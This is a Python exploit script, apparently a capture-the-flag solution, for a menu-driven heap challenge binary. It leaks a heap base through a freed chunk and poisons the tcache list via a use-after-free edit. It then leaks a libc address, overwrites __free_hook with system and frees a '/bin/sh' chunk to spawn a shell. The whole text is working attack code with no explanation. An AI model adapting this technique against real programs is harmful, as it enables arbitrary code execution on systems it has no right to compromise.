from helper import *
from helper.heap import heap_helper
from helper.load import *

def new(size,con):
    info(f"new {size} {con}")
    sla(": ",'1')
    sla("size: \n",size)
    sla("Content: ",con)
def edit(idx,con):
    info(f"edit {idx} {con}")
    sla(": ",'2')
    sla("index: \n",idx)
    sla("content: ",con)
def free(idx):
    info(f"free {idx}")
    sla(": ",'3')
    sla("index: \n",idx)
def show(idx):
    info(f"show {idx}")
    sla(": ",'4')
    sla("index: \n",idx)

new(0x80, "0")
new(0x80, "1")
new(0x70, "2")
free(0);free(1);free(2);show(1)
heap_base = uu64(r(6)) & 0xffff_ffff_ffff_f000
info(f"heap base: {hex(heap_base)}")
edit(1, p64(heap_base)) # tc->1->0 <=> tc->1->base
new(0x80, "3")          # actually is `1`
new(0x80, flat([0, 0x291, b'\xff'*0x10]))          # actually is `base`
free(0);show(0)
heap = heap_helper(libc, 'main_arena', leak()-96)
edit(2, p64(heap.free_hook))
new(0x70, b"/bin/sh\x00");new(0x70, p64(heap.system))
free(2)

shell()


